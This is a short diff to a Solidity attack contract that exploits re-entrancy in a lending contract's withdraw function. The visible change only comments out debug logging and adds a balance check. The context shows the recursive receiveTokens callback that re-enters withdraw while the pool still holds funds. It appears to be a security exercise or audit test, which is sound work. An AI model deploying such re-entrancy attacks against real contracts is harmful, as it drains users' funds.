@@ -24,12 +24,15 @@ contract AttackContract {
 
         // Run the attack to exploit re-entrency in withdraw function
         lendingBorrowing.withdraw(amount);
+
+        uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
+        //console.log("balance: %s", balance);
     }
 
     // This is the function that gets called recursively by the withdraw function
     function receiveTokens(address sender, uint256 amount) public {
         uint256 balance = s_usdc.balanceOf(address(lendingBorrowing));
-        console.log("balance: %s", balance);
+        //console.log("balance: %s", balance);
 
         if (balance > amount) {
             console.log("reentry");
